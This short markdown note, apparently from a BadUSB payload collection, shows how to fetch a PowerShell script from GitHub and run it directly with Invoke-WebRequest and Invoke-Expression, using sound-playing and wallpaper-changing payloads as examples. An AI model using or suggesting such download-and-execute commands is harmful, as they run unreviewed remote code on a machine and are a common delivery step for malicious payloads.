### Download and direclty run a powershell script

    $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/username/script.ps1
    Invoke-Expression $($ScriptFromGithHub.Content)

Example - Play Sound

    $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/offport/BadUSB/main/Windows/Payloads/PlaySound.ps1 -UseBasicParsing
    Invoke-Expression $($ScriptFromGithHub.Content)
    
Example - Change Wallpaper

    $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/offport/BadUSB/main/Windows/Payloads/ChangeWallpaper.ps1 -UseBasicParsing
    Invoke-Expression $($ScriptFromGithHub.Content)

If you get the error "The response content cannot be parsed because the Internet  Explorer engine is not available,", Add the following opion:

    -UseBasicParsing
